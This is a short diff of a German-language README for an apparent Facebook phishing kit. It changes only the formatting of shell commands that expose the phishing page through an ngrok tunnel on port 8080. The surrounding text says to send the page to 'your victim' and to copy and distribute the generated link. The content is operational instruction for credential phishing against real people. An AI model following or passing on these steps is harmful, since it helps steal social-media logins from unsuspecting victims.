@@ -93,9 +93,9 @@ Jetzt können Sie Ihre Facebook-Phishing Seite einfach per Ngrok an Ihr Opfer we
 
 -gehe zum Ordner wo NGROK vorhanden ist
 (hier im ordner G0D.... )
-  cd G0D
+  > cd G0D
 
-  ./ngrok http 8080
+  > ./ngrok http 8080
 
 Oben rechts den unteren Link kopieren, und nun verschicken
 Beispiel:
